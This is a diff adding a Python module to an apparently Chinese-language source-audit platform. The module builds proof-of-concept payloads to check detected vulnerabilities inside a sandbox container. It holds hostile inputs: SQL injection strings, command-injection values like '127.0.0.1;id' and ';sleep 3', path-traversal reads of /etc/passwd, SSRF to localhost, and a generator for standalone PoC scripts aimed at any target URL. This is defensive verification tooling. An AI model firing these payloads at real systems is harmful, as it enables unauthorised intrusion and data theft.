@@ -1,0 +1,348 @@
+"""POC 自动验证 skill：通过沙箱容器内 HTTP 请求验证漏洞（internal 网络，宿主不暴露端口）"""
+import re
+import time
+from pathlib import Path
+
+
+def _find_func_name(lines: list[str], line: int) -> str | None:
+    """向前找包含该行（含之前）的最近函数定义名"""
+    for i in range(max(line - 1, 0), -1, -1):
+        m = re.search(r'function\s+(\w+)\s*\(', lines[i])
+        if m:
+            return m.group(1)
+    return None
+
+
+def extract_php_action(workspace: str, file_path: str, line: int) -> dict | None:
+    """PHP action 分发解析：$_xxx['action'] + switch case → {'action': case, 'params': [键列表]}
+    例：action=download & file 参数（perfect.php 的 $fm->download($_GET['file'])）"""
+    try:
+        lines = (Path(workspace) / file_path).read_text(errors="ignore").splitlines()
+    except OSError:
+        return None
+    fn = _find_func_name(lines, line)
+    if not fn:
+        return None
+    # action 变量名
+    act_var = None
+    for ln in lines:
+        m = re.search(r'\$(\w+)\s*=\s*\$_?(?:GET|POST|REQUEST)\[\s*[\'"]action[\'"]\s*\]', ln)
+        if m:
+            act_var = m.group(1)
+            break
+    if not act_var:
+        return None
+    switch_idx = None
+    for i, ln in enumerate(lines):
+        if re.search(r'switch\s*\(\s*\$' + act_var + r'\s*\)', ln):
+            switch_idx = i
+            break
+    if switch_idx is None:
+        return None
+    for j in range(switch_idx + 1, len(lines)):
+        m = re.match(r'\s*case\s*[\'"]([\w\-]+)[\'"]\s*:', lines[j])
+        if not m:
+            continue
+        case_val = m.group(1)
+        body = []
+        k = j + 1
+        while k < len(lines) and k < len(lines) and not re.search(r'\s*case\s*[\'"]', lines[k]) and 'break' not in lines[k]:
+            body.append(lines[k])
+            k += 1
+        body_text = "\n".join(body)
+        if f'->{fn}(' in body_text or re.search(rf'(?<![>\w]){fn}\s*\(', body_text):
+            keys = re.findall(r'\$_?(?:GET|POST|REQUEST)\[\s*[\'"]([\w\-]+)[\'"]\s*\]', body_text)
+            # 参数来源决定 HTTP 方法：出现 $_POST 即 POST，仅 $_GET 为 GET，两者都有优先 POST
+            method = "POST" if re.search(r'\$_POST\[', body_text) else "GET"
+            return {"action": case_val, "params": keys, "method": method}
+    return None
+
+
+def extract_route(workspace: str, file_path: str, line: int) -> str | None:
+    """从漏洞所在源文件中，向上查找最近的路由注解/注册，返回路径"""
+    candidates = [
+        re.compile(r'@app\.route\(\s*["\']([^"\']+)'),
+        re.compile(r'@router\.(?:get|post|route)\(\s*["\']([^"\']+)'),
+        re.compile(r'@(?:GetMapping|PostMapping|RequestMapping)\(\s*["\']?([^"\'),]+)'),
+    ]
+    try:
+        full = Path(workspace) / file_path
+        lines = full.read_text(errors="ignore").splitlines()[: max(line, 1)]
+    except OSError:
+        return None
+    for i in range(len(lines) - 1, -1, -1):
+        for pat in candidates:
+            m = pat.search(lines[i])
+            if m:
+                route = m.group(1).strip()
+                if not route.startswith("/"):
+                    route = "/" + route
+                return route
+    return None
+
+
+def _parse_qs(s: str) -> dict:
+    """解析 urlencoded 键值对 → dict"""
+    out = {}
+    for kv in (s or "").split("&"):
+        if "=" in kv:
+            k, _, v = kv.partition("=")
+            out[k.strip()] = v
+    return out
+
+
+def parse_poc_request(payload: str) -> dict:
+    """解析 POC payload 字符串为 {method, route, query_params, body_params}。
+    兼容形态：
+    - 'GET /perfect.php?action=download&file=/etc/passwd'
+    - 'POST /perfect.php?action=update\\nid=1 OR 1=1&email=a@b.com'（新格式：query 放 action，body 放注入参数）
+    - 旧格式 'POST /perfect.php?action=update  body: id=1 OR 1=1&email=a@b.com'
+    - 无方法前缀/无路由形态按 POST body 处理"""
+    payload = (payload or "").strip().strip("`")
+    if " body:" in payload:
+        head, _, body = payload.partition(" body:")
+    else:
+        head, _, body = payload.partition("\n")
+    head, body = head.strip(), body.strip()
+    mm = re.match(r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+(.+)$", head, re.IGNORECASE)
+    if mm:
+        method = mm.group(1).upper()
+        rest = mm.group(2).strip()
+        if rest.startswith("/"):
+            route, _, qs = rest.partition("?")
+            if not route.startswith("/"):
+                route = "/" + route
+            return {"method": method, "route": route,
+                    "query_params": _parse_qs(qs), "body_params": _parse_qs(body)}
+        # 如 "POST action=update&id=1 OR 1=1&email=a@b.com"：无路由，全部当 body
+        return {"method": method, "route": "/",
+                "query_params": {}, "body_params": _parse_qs(rest or body)}
+    if "=" in head and ("&" in head or "action" in head):
+        return {"method": "POST", "route": "/", "query_params": {}, "body_params": _parse_qs(head)}
+    q = head[1:] if head.startswith("?") else head
+    return {"method": "GET", "route": "/", "query_params": _parse_qs(q), "body_params": {}}
+
+
+def normalize_payload(payload: str) -> str:
+    """将任意形态（含 Agent 自由提交、旧 body: 前缀）的 payload 规范化为干净文本：
+    - POST: POST /route?action=xxx\n注入参数=k
+    - GET:  GET /route?k=v
+    供落库与展示统一使用，避免出现 'body: 这个是啥' 的困惑。"""
+    req = parse_poc_request(payload)
+    method = req["method"]
+    route = req["route"] or "/"
+    q = "&".join(f"{k}={v}" for k, v in req["query_params"].items())
+    b = "&".join(f"{k}={v}" for k, v in req["body_params"].items())
+    url = f"{route}?{q}" if q else route
+    if method == "POST":
+        return f"POST {url}" + (f"\n{b}" if b else "")
+    return f"GET {url}" + (f"\n{b}" if b else "")
+
+
+def generate_python_poc(payload: str, label: str = "漏洞") -> str:
+    """根据已验证的 payload 生成独立可运行的 Python POC 脚本（requests，面向真实部署）"""
+    import urllib.parse
+    req = parse_poc_request(payload)
+    method = req["method"]
+    route = req["route"]
+    # GET 的查询串必须 URL 编码：payload 含空格/引号/中文时裸拼会生成无效 URL
+    q = urllib.parse.urlencode(req["query_params"])
+    url_full = (route + "?" + q) if q else route
+    params = req["body_params"]
+    is_post = method == "POST"
+    call = f"    r = requests.{'post' if is_post else 'get'}(URL, {'data' if is_post else 'params'}=PARAMS, timeout=15)"
+    return f"""#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# 漏洞 POC（源码审计平台自动生成）: {label}
+# 用法: python3 poc.py [目标URL]   默认 http://127.0.0.1:8000
+import sys
+
+import requests
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8000'
+URL = TARGET + {url_full!r}
+PARAMS = {params!r}
+
+
+def main():
+{call}
+    print('HTTP', r.status_code)
+    print('-' * 60)
+    print(r.text[:3000])
+    if r.status_code == 200:
+        print('[-] 漏洞触发失败或未命中（200 不代表无漏洞，请结合回显判断）')
+    else:
+        print('[+] 目标返回异常状态码，漏洞可能已触发（请结合回显判断）')
+
+
+if __name__ == '__main__':
+    main()
+"""
+
+
+def _php_payload(php: dict | None, rule: str) -> dict | None:
+    """PHP action 分发下的 payload；键优先匹配语义（file/url/id 等）"""
+    if not php:
+        return None
+    keys = php["params"]
+    if not keys:
+        return None
+
+    def key_for(prefs: list[str], default=None) -> str | None:
+        for k in keys:
+            for p in prefs:
+                if p in k:
+                    return k
+        return default
+
+    base = {"route": "/", "method": php.get("method", "GET"), "params": dict(action=php["action"])}
+    if "sql" in rule or "query" in rule:
+        idk = key_for(("id", "user", "uid"))
+        emk = key_for(("email",))
+        if idk:
+            base["params"][idk] = "1 OR 1=1"
+        if emk:
+            base["params"][emk] = "a@b.com"
+        if not idk and not emk:
+            base["params"][keys[0]] = "1 OR 1=1"
+        base["expect"] = ["sql", "syntax", "error", "mysql", "warning", "pdo", "exception", "query"]
+        return base
+    if "ssrf" in rule or "remote" in rule:
+        uk = key_for(("url", "uri", "link"))
+        base["params"][uk if uk else keys[0]] = "http://127.0.0.1:80/"
+        base["expect"] = []
+        return base
+    if "delete" in rule or "unlink" in rule or "rmdir" in rule:
+        fk = key_for(("file", "name", "path", "filename"))
+        base["params"][fk if fk else keys[0]] = "....//....//etc/passwd"
+        base["expect"] = ["file deleted"]
+        return base
+    if "read" in rule or "file" in rule or "inclusion" in rule or "include" in rule or "contents" in rule:
+        fk = key_for(("file", "name", "path", "filename"))
+        base["params"][fk if fk else keys[0]] = "/etc/passwd"
+        base["expect"] = ["root:", "/bin/"]
+        return base
+    if "command" in rule or "cmd" in rule or "shell" in rule or "exec" in rule:
+        hk = key_for(("host", "ip", "url"))
+        base["params"][hk if hk else keys[0]] = "127.0.0.1;id"
+        base["expect"] = ["uid="]
+        return base
+    return None
+
+
+def build_poc(vuln: dict, workspace: str = "") -> dict | None:
+    """根据规则类型构造 POC：返回 {route, params, expect} 或 None"""
+    rule = vuln["rule_id"].lower()
+    fp = vuln.get("file_path", "")
+    line = vuln.get("line", 0)
+    route = extract_route(workspace, fp, line) or "/"
+
+    # PHP：尝试 action 分发（优先于通用路由）
+    if str(fp).lower().endswith(".php"):
+        php = extract_php_action(workspace, fp, line)
+        php_poc = _php_payload(php, rule)
+        if php_poc:
+            return php_poc
+
+    if "sql-injection" in rule:
+        return {"route": route, "params": {"id": "1 OR 1=1"},
+                "expect": ["sql", "syntax", "error", "sqlite", "mysql", "union", "warning"]}
+    if "command-injection" in rule:
+        return {"route": route, "params": {"host": "127.0.0.1;id"},
+                "expect": ["uid=", "gid="]}
+    if "eval-exec" in rule or "code-injection" in rule or "code-execution" in rule:
+        return {"route": route, "params": {"expr": "1+1"}, "expect": ["2"]}
+    if "path-traversal" in rule or "file-inclusion" in rule:
+        return {"route": route,
+                "params_list": [
+                    {"name": "../../../../etc/passwd"},
+                    {"name": "....//....//etc/passwd"},
+                    {"name": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
+                ],
+                "params": {"name": "../../../../etc/passwd"},
+                "expect": ["root:", "/bin/"]}
+    if "ssrf" in rule:
+        return {"route": route, "params": {"url": "http://127.0.0.1:80"}, "expect": []}
+    if "xss" in rule:
+        return {"route": route, "params": {"name": "<b>POC_XSS</b>"},
+                "expect": ["<b>poc_xss</b>"]}
+    if "deserialization" in rule or "pickle" in rule:
+        return {"route": route, "params": {"data": "gASV"}, "expect": []}
+    return None
+
+
+def poc_payload_str(poc: dict) -> str:
+    """将 POC 结构化为清晰文本（无 'body:' 前缀）：
+    - GET:  GET /route?k=v&k2=v2
+    - POST: POST /route?action=xxx\\n注入参数=payload（action 放 query，其余放 body，更贴近真实请求包）"""
+    params = dict(poc.get("params") or {})
+    method = poc.get("method", "GET").upper()
+    route = poc.get("route", "/") or "/"
+    if method == "POST":
+        action = params.pop("action", None)
+        body = "&".join(f"{k}={v}" for k, v in params.items())
+        url = f"{route}?action={action}" if action and "?" not in route else route
+        return f"POST {url}" + (f"\n{body}" if body else "")
+    qs = "&".join(f"{k}={v}" for k, v in params.items())
+    sep = "&" if "?" in route else "?"
+    return f"GET {route}{sep}{qs}" if qs else f"GET {route}"
+
+
+def verify(vuln: dict, workspace: str, handle) -> tuple[bool, str]:
+    """执行单个 POC（handle.request 为容器内 HTTP 请求），返回 (poc_verified, verify_result)"""
+    poc = build_poc(vuln, workspace)
+    if poc is None or handle is None or not getattr(handle, "internal_port", None):
+        return False, "该规则类型暂不支持自动 POC 或沙箱未就绪"
+    rule = vuln["rule_id"].lower()
+
+    # 命令注入：时序盲注检测（sleep 3 与基线请求对比）
+    if "command-injection" in rule:
+        try:
+            t0 = time.time()
+            handle.request(poc["route"], {"host": "127.0.0.1"}, method="GET")
+            base_t = time.time() - t0
+            t1 = time.time()
+            handle.request(poc["route"], {"host": "127.0.0.1;sleep 3"}, method="GET")
+            delay_t = time.time() - t1
+            if delay_t - base_t >= 2.5:
+                return True, f"时序盲注成立：注入请求耗时 {delay_t:.1f}s（基线 {base_t:.1f}s）"
+            return False, f"时序差异不足：注入 {delay_t:.1f}s vs 基线 {base_t:.1f}s"
+        except Exception as e:
+            return False, f"请求失败: {type(e).__name__}"
+
+    # 通用：单 payload 或多 payload 逐一尝试
+    method = poc.get("method", "GET")
+    params_list = poc.get("params_list") or [poc["params"]]
+    baseline_500 = False
+    try:
+        for params in params_list:
+            status, body = handle.request(poc["route"], params, method=method)
+            low = (body or "").lower()
+            hits = [k for k in poc["expect"] if k.lower() in low]
+            if hits:
+                return True, f"HTTP {status}，响应命中特征: {hits}"
+            if status >= 500:
+                baseline_500 = True
+        if baseline_500:
+            return True, "payload 触发服务端异常（与正常请求行为不同），疑似复现"
+        return False, "响应未命中特征"
+    except Exception as e:
+        return False, f"请求失败: {type(e).__name__}"
+
+
+def verify_all(vuln_rows: list[tuple], workspace: str, handle, max_n: int = 8) -> int:
+    """批量验证，就地写入 row.poc_* 字段，返回验证通过条数"""
+    passed = 0
+    for row, v in vuln_rows[:max_n]:
+        try:
+            ok, result = verify(v, workspace, handle)
+            poc = build_poc(v, workspace)
+            row.poc_payload = poc_payload_str(poc) if poc else None
+            row.poc_verified = ok
+            row.verify_result = result
+            if ok:
+                passed += 1
+        except Exception as e:
+            row.poc_verified = False
+            row.verify_result = f"POC 执行异常: {e}"[:300]
+    return passed
